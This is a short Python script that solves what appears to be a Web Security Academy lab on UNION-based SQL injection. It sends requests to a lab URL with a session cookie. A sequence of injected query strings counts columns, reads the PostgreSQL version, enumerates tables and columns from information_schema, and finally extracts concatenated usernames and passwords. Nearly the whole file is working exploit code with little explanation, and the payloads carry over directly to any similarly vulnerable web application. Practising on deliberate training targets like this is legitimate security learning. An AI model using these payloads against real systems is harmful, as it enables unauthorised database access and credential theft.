#!/usr/bin/env python3

import urllib.parse
import requests

# SQL injection attack, listing the database contents on non-Oracle databases

link = "https://ac6a1f741e443023c03d33870032005f.web-security-academy.net/filter?category=Pets"
payload={}
headers = {
  'Cookie': 'session=CeFu35Igm87bsS5chNCK9h6NmqLq9S0v'
}

#chunk = "' UNION SELECT 'a','a'--" # number of columns, both are text
#chunk = "' UNION SELECT NULL,version()--" # database version = postgres
#chunk = "' UNION SELECT NULL,table_name FROM information_schema.tables--" # show tables in one field
#chunk = "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name = 'users_gvpjvm'--" # show columns of table
chunk = "' UNION SELECT username_nbuwfb||'-'||password_vxyodj,NULL FROM users_gvpjvm--" # show columns of table
url = link + urllib.parse.quote(chunk)

response = requests.request("GET", url, headers=headers, data=payload)

print(url)
print(response.status_code)
